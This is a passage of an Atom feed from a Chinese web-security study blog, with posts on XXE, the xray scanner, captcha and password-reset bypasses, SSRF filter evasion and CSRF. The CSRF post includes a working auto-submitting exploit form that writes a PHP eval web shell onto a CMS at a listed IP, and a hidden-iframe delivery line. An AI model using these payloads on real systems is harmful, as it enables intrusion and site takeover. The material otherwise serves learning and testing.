这里可能会被认为是锚点导致传参不完整</p><h2 id="2、看到数据包莫名其妙传递、返回XML代码-可以试试XXE"><a href="#2、看到数据包莫名其妙传递、返回XML代码-可以试试XXE" class="headerlink" title="2、看到数据包莫名其妙传递、返回XML代码,可以试试XXE"></a>2、看到数据包莫名其妙传递、返回XML代码,可以试试XXE</h2><h1 id="修复XXE的方法"><a href="#修复XXE的方法" class="headerlink" title="修复XXE的方法"></a>修复XXE的方法</h1><p>​    1、libxml_disable_entity_loader(true);  PHP的函数（禁止加载XML实体）<br>​    2、过滤SYSTEM关键字</p>]]></content>
    
    
    <summary type="html">XXE定义, 如何寻找XXE</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="XXE实体注入" scheme="https://dtxharry.github.io/tags/XXE%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>自动化漏扫xray</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%89%ABxray/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%89%ABxray/</id>
    <published>2023-08-21T08:41:49.000Z</published>
    <updated>2023-08-22T01:35:22.022Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞扫描工具"><a href="#漏洞扫描工具" class="headerlink" title="漏洞扫描工具"></a>漏洞扫描工具</h1><p>自动化检测漏洞的工具 :AWVS | Xray | Nessus | appscan | Goby</p><p>X-ray不开源,下载地址：<a href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a><br>                    使用文档：<a href="https://docs.xray.cool/#/tutorial/introduce">https://docs.xray.cool/#/tutorial/introduce</a></p><p>优点：<br>        1、省时省力<br>        2、人测试会容易有遗失，工具辅助一下，测试的会更全面</p><p>缺点:<br>        1、容易出事<br>        2、容易误伤<br>        3、可能效果不佳、检测出来漏洞都过于典型和明显<br>        4、漏扫会给出一些莫名其妙的漏洞</p><p>不知道他到底干了什么, 我手上有个1000条语句，可以测试200种漏洞。全部糊上去试试，看返回结果（野）,容易把目标搞瘫痪,比如后台有xss,误伤是因为类似爬虫,爬到目标网页的其他外链,就会误伤别的网站(政府网站那不就废了吗),而且可能效果不佳、检测出来漏洞都过于典型和明显</p><h1 id="X-ray的命令"><a href="#X-ray的命令" class="headerlink" title="X-ray的命令"></a>X-ray的命令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ws(webscan的缩写) </span><br><span class="line">--url 指定当前页面扫描(不会扩展)  http://testphp.vulnweb.com </span><br><span class="line">--url &quot;http://testphp.vulnweb.com/&quot;</span><br><span class="line">--basic-crawler 模拟用户爬虫测试</span><br><span class="line">--html-output 1.html 网页格式</span><br><span class="line"> --text 文本格式</span><br><span class="line">--json json格式</span><br></pre></td></tr></table></figure><h1 id="漏扫扫描方式："><a href="#漏扫扫描方式：" class="headerlink" title="漏扫扫描方式："></a>漏扫扫描方式：</h1><p>​        1、主动扫描<br>​            你给漏扫目标，让他去测试。<br>​        2、被动扫描<br>​            我不给他目标，让他自己去测。我把我浏览器的数据包给他，他根据我的数据包逐一测试</p><p>1、安装浏览器代理插件foxyproxy，SwitchyOmega等都行</p><p>2、启动Xray，生成ca证书命令：xray_windows_amd64.exe genca</p><p>3、安装证书并信任（只装一次就可）浏览器安装证书的方法有所查别，具体可参考Xray的使用文档（Firefox 浏览器只能在浏览器内导入证书）</p><p>4、运行Xray，开启监听命令：xray_windows_amd64.exe webscan —listen 127.0.0.1:7777 —html-output test.html5、浏览器启用代理，端口与 Xray 一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray_windows_amd64.exe webscan --listen 127.0.0.1:8888 --html-output listen.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">介绍一款漏扫工具</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    <category term="渗透工具" scheme="https://dtxharry.github.io/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="渗透工具" scheme="https://dtxharry.github.io/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    <category term="扫描" scheme="https://dtxharry.github.io/tags/%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>验证码绕过,密码找回</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/</id>
    <published>2023-08-21T08:37:26.000Z</published>
    <updated>2023-08-21T14:43:43.418Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><p>产生的问题是逻辑而不是代码问题(工具扫不出来的),只能手工测试,比如:越权漏洞,验证码绕过,支付漏洞,密码找回漏洞</p><h1 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过:"></a>验证码绕过:</h1><h2 id="验证码的目的"><a href="#验证码的目的" class="headerlink" title="验证码的目的:"></a>验证码的目的:</h2><p>全自动区分计算机和人类的图灵测试（现在已经不单纯了）.以前是完全为了防止被爆破、灌水内容、垃圾注册、恶意登录、刷票、撞库、活动作弊、垃圾广告、爬虫、羊毛党等,现在还有一个方便用户无账号密码登录的验证身份的作用(短信\邮箱验证码（知道微信、支付宝、美团密码）：通过持有手机号来证明你的身份权限)</p><h2 id="代码逻辑错误"><a href="#代码逻辑错误" class="headerlink" title="代码逻辑错误"></a>代码逻辑错误</h2><p>1、前端验证验证码：验证码在浏览器验证, 可以禁用JS，修改JS的数据包[任何的前端检测都是没有检测]<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0114577">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0114577</a></p><p>2、验证码设置了但是并没有校验，乱输验证码也能够成功的登录[找XSS平台]</p><p>3、验证码可以重复使用[拿着对的验证码不断的去尝试替换数据包信息]</p><p>4、验证码空值绕过 [常见情况下，多次输入才有验证码。if有验证码传参、没有传参我们就不验证] HTTP无状态、无连接（IP/Cookie）</p><p>5、脚本识别(验证码爆破工具PKAV/Python脚本)</p><p>6、验证码会在HTML页面输出(简单爬虫)<br>      <a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0146767">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0146767</a></p><p>7、验证码可控制(开关型的字符,传参出现True\False  出现Yes\No 出现 1\0 要注意 这些东西一般都是开关),或者有的验证码的发送和目标的手机号没有绑定;<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-086716">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-086716</a></p><p>8、验证码有规则 (你能推算出下个验证码是什么[时间戳:计算机讲究把一切都变数字，用数字来代替时间以格林威治时间1970年01月01日00时00分00秒为开始,  <a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a>    ])</p><p>9、万能验证码(一个特殊验证码，用了就不检验 [设备上有、网站不常见]) 万能账户、密码</p><p>10、验证码有的时候会藏在cookie里面,分析一下是不是存在验证码的参数 (a=xy1ty)</p><p>11、图片验证码，类型太少</p><p>12.多次登录后才出现验证码绕过：<br>            基于session：<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0114450">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0114450</a><br>            基于ip: <a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-080327">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-080327</a><br>            [任何基于IP的东西都可以先试试XFF (X-Forwarded-For)]</p><p>13.直接修改密码页面（直接访问修改密码的页面，就直接修改密码（逻辑缺失））<a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-040908">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-040908</a></p><p>14.越权漏洞—&gt;自己验证码通过改包然后修改他们密码<br><a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0102205">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0102205</a><br><a href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-016896">http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-016896</a></p><h1 id="密码找回漏洞"><a href="#密码找回漏洞" class="headerlink" title="密码找回漏洞"></a>密码找回漏洞</h1><p>在注册之前，通过预先设定一个密保问题，忘记密码时，通过此密保进行认证，认证成功进入密码修改页面;  </p><p>密保问题可能容易直接被猜测  （比如很多学校的知道学号和身份证号码就可以重置校园通的密码）</p><p>密保问题答案页面中显示（数据包里面可能自带了密保答案，可能在JS里面）</p>]]></content>
    
    
    <summary type="html">简单的一些逻辑漏洞</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="逻辑漏洞" scheme="https://dtxharry.github.io/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>SSRF-服务器请求伪造攻击</title>
    <link href="https://dtxharry.github.io/2023/08/21/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/"/>
    <id>https://dtxharry.github.io/2023/08/21/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/</id>
    <published>2023-08-21T08:36:26.000Z</published>
    <updated>2023-08-21T14:47:17.108Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSRF定义"><a href="#SSRF定义" class="headerlink" title="SSRF定义"></a>SSRF定义</h1><p>服务器端请求伪造（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求的对其他网站进行攻击。(利用一个可发起网络请求的服务当作跳板来攻击其他服务)<br>攻击者能够利用目标帮助攻击者访问其他想要攻击的目标,即A让B帮忙访问C</p><p>典型的SSRF: 我们传参然后对方服务器去访问</p><h2 id="与CSRF的区别"><a href="#与CSRF的区别" class="headerlink" title="与CSRF的区别"></a>与CSRF的区别</h2><p>CSRF(跨站/客户端请求伪造) =&gt; 浏览器因为Js偷偷的发送数据包</p><p>SSRF(服务器端请求伪造) =&gt; 服务器因为你的传参偷偷发送数据包</p><p>翻译网页 =&gt;<code>http://web.yeekit.com/</code> <code>http://fanyi.youdao.com</code><br>翻译单词 =&gt; POST/GET 传参去 数据库查询<br>翻译页面 =&gt; 翻译网站直接替代我们去访问那个目标站点，然后获得内容后查询英文对应，然后处理完返回给我们</p><h1 id="SSRF的危害"><a href="#SSRF的危害" class="headerlink" title="SSRF的危害"></a>SSRF的危害</h1><p>1、[核心目的] 访问内网(外紧内松)  （要能访问内网,能访问本机）,即穿越防火墙的通行证<br>2、隐藏攻击者（当做跳板机来躲避追踪）<br>3、攻击目标本机（dict://可以探测端口   ;    file://协议可以读取文件,例如数据库的账户密码）<br>    （有些网站对127.0.0.1的访问是不设防的）<br>      WAF（不会拦截你的SSRF攻击）</p><p>dict://协议的使用 : <code>XXXX.php?url=dict://127.0.0.1:80</code></p><p>file://协议的使用 :  file:///F:/p_h_p/A_A_A/1.txt<br>                              <strong>要注意,如果例如.php文件显示不出来,可能是被浏览器和谐掉了,可以查看网页源码查看</strong></p><p>SSRF还可以与存储型XSS联动做一个反射型XSS,例如靶场留言板弹cookie</p><h1 id="如何判断是否存在SSRF"><a href="#如何判断是否存在SSRF" class="headerlink" title="如何判断是否存在SSRF"></a>如何判断是否存在SSRF</h1><p>在实战中,只要确定那个传参传进去的网站被对方服务器访问了就可能存在,所以可以利用DNSlog平台进行判定<code>dnslog.cn</code>   </p><p>要注意, dnslog 只能针对有外网的服务器, 实战中不能忽视无外网的服务器, 可以进行内网ip的强扫</p><p>项目上只要能发起请求就算漏洞(网站功能除外),但SRC需要可以访问内网和本机</p><h1 id="域名-端口-与-内网ip-端口-的区别"><a href="#域名-端口-与-内网ip-端口-的区别" class="headerlink" title="域名:端口    与   内网ip:端口  的区别"></a><strong>域名:端口</strong>    与   <strong>内网ip:端口</strong>  的区别</h1><p><code>127.0.0.1:81</code> 当前存在SSRF漏洞的主机的81端口</p><p> 域名:81  这个域名对应ip的81端口</p><p>​    ip (公网ip) =&gt; 内网可能有10个主机</p><h1 id="绕过SSRF防护的一些手法"><a href="#绕过SSRF防护的一些手法" class="headerlink" title="绕过SSRF防护的一些手法"></a>绕过SSRF防护的一些手法</h1><p>不能访问内网时,可以尝试以下操作</p><p>1、<code>http://www.baidu.com@127.0.0.1</code><br>2、纯数字ip地址：<br>                    <code>http://www.baidu.com</code><br>                    <code>http://112.80.248.73</code><br>                    <code>http://1884354633</code><br>                    <code>http://0016024174111</code><br>                    <code>http://0x7050f849</code></p><h1 id="扩展内容（不要求掌握-）"><a href="#扩展内容（不要求掌握-）" class="headerlink" title="扩展内容（不要求掌握 ）"></a>扩展内容（不要求掌握 ）</h1><h2 id="gopher协议：-可以发起TCP数据流"><a href="#gopher协议：-可以发起TCP数据流" class="headerlink" title="gopher协议： 可以发起TCP数据流"></a>gopher协议： 可以发起TCP数据流</h2><p>​    TCP: 有连接状态的东西<br>​    UDP: 漂流瓶联系（我就发送数据，不管你收到没）</p><h2 id="redis未授权访问（SSRF攻击的东西）"><a href="#redis未授权访问（SSRF攻击的东西）" class="headerlink" title="redis未授权访问（SSRF攻击的东西）"></a>redis未授权访问（SSRF攻击的东西）</h2><p>​    redis 缓存数据库（默认没有密码 外网访问不到）</p>]]></content>
    
    
    <summary type="html">服务器端请求伪造的定义与绕过防护的手法</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="SSRF" scheme="https://dtxharry.github.io/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>CSRF-跨站请求伪造攻击</title>
    <link href="https://dtxharry.github.io/2023/08/21/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/"/>
    <id>https://dtxharry.github.io/2023/08/21/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/</id>
    <published>2023-08-21T08:35:32.000Z</published>
    <updated>2023-08-22T01:37:44.541Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSRF定义"><a href="#CSRF定义" class="headerlink" title="CSRF定义"></a>CSRF定义</h1><p>CSRF（Cross-site request forgery）<br>跨站请求伪造：也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。<br>尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。<br>其实说白了，csrf漏洞的成因就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个都网站，会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的csrf脚本或包含csrf脚本的链接，可能会执行一些用户不想做的功能（比如是添加账号等）  </p><p>浏览器在你不知情的情况下偷偷的发送了数据包  （安全的本质就是信任）<br>你主动访问的某个站点，代表你信任那个站点</p><p> js(可以发送数据包) ajax阿贾克斯异步传输</p><p><strong>任何的网站功能,本质上就是数据包的传递</strong></p><h1 id="CSRF实现的条件"><a href="#CSRF实现的条件" class="headerlink" title="CSRF实现的条件"></a>CSRF实现的条件</h1><p>1、存在CSRF漏洞<br>2、黑客要自己做一个貌似合理的页面骗受害者来点击<br>         你设置的网页，他是有指向性的,只能指定构造指定ip的数据包 （百度、QQ存在CSRF的话很危险）<br>3、目标登录过这个网站或者这个网站的权限没有掉(例如一次会话内)</p><h1 id="CSRF的防治"><a href="#CSRF的防治" class="headerlink" title="CSRF的防治"></a>CSRF的防治</h1><h2 id="1-无痕浏览-隐私模式"><a href="#1-无痕浏览-隐私模式" class="headerlink" title="1.无痕浏览,隐私模式"></a>1.无痕浏览,隐私模式</h2><p>其中,要注意这不是无敌的,我们要知道无痕的逻辑<br>(1)不会留下历史记录<br>(2)和正常模式隔离<br>        这意味着,隐私模式中登录了网站还是会产生有权限的cookie,且第二个隐私模式的窗口依然会继承这些cookie进行免登录.</p><h2 id="2-Token-唯一解"><a href="#2-Token-唯一解" class="headerlink" title="2.Token (唯一解)"></a>2.Token (唯一解)</h2><p>Token   :   Cookie里面有一段随机值，和请求包里面的GET或者POST传参有一个关联</p><p>没有Token就可能有CSRF </p><h1 id="CSRF的判定"><a href="#CSRF的判定" class="headerlink" title="CSRF的判定"></a>CSRF的判定</h1><p>找一个站，登录A用户，修改自己的账号密码,  然后把数据包做成CSRF<br>换个浏览器，登录B,  点击做好的CSRF，只要能修改就是了</p><h1 id="如何将数据包做成CSRF"><a href="#如何将数据包做成CSRF" class="headerlink" title="如何将数据包做成CSRF"></a>如何将数据包做成CSRF</h1><p>burp抓到包后右键找到engagement tools下的Generate CSRF PoC,即可保存这个html.</p><p>但是此时burp生成的是有一个按钮要真的点击才能发包的,真实情况下需要设置成自动发包,此时需要加一个js代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&#x27;aaa&#x27;</span> <span class="attr">action</span>=<span class="string">&quot;http://59.63.200.79:8010/newcsrf/dede/file_manage_control.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fmdo&quot;</span> <span class="attr">value</span>=<span class="string">&quot;edit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;backurl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;activepath&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;#47;</span>newcsrf<span class="symbol">&amp;#47;</span>uploads&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">value</span>=<span class="string">&quot;777<span class="symbol">&amp;#46;</span>php&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;lt;</span><span class="symbol">&amp;#63;</span>php<span class="symbol">&amp;#32;</span><span class="symbol">&amp;#64;</span>eval<span class="symbol">&amp;#40;</span><span class="symbol">&amp;#36;</span><span class="symbol">&amp;#95;</span>REQUEST<span class="symbol">&amp;#91;</span>8<span class="symbol">&amp;#93;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#63;</span><span class="symbol">&amp;gt;</span>&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;B1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span>�<span class="symbol">&amp;#191;</span><span class="symbol">&amp;#157;</span><span class="symbol">&amp;#32;</span>�<span class="symbol">&amp;#173;</span><span class="symbol">&amp;#152;</span><span class="symbol">&amp;#32;</span><span class="symbol">&amp;#32;</span>&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;aaa&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.其中<code>&lt;form&gt;</code>标签加入id=’XXX’属性, 与下面的document.getElementById(‘XXX’).submit()对应就好</p><p>2.action=”<a href="http://59.63.200.79:8010/newcsrf/dede/file_manage_control.php">http://59.63.200.79:8010/newcsrf/dede/file_manage_control.php</a>“ 中的域名和文件也要事先做好确认,因为是cms所以很好确定域名(社工)和路径(基本一致),这个文件存在的话就可以下一步了</p><p>3.<code>&lt;input type=&quot;hidden&quot; name=&quot;activepath&quot; value=&quot;&amp;#47;newcsrf&amp;#47;uploads&quot; /&gt;</code>这里的路径也要测试是否更改</p><h1 id="总结-构造CSRF的基本流程"><a href="#总结-构造CSRF的基本流程" class="headerlink" title="总结:构造CSRF的基本流程"></a>总结:构造CSRF的基本流程</h1><p>1.CMS发现CSRF漏洞<br>2.本地构建出来<br>3.构建一个新的页面,将恶意的带着CSRF的html塞进去<br>4.让目标访问</p><h2 id="如何把html塞进去"><a href="#如何把html塞进去" class="headerlink" title="如何把html塞进去"></a>如何把html塞进去</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://59.63.200.79:8003/&quot; width=&quot;0&quot; height=&quot;0&quot;/&gt;</span><br></pre></td></tr></table></figure><p>iframe是内联框架的意思,有这个内联的页面会进行两次请求,第一次是页面本身,第二次是嵌套的这个页面,因为长宽高设置为0所以放在最后很难被察觉</p>]]></content>
    
    
    <summary type="html">简单讲解跨站请求伪造的构造以及如何防范</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="CSRF" scheme="https://dtxharry.github.io/tags/CSRF/"/>
    
  </entry>
  
</feed>
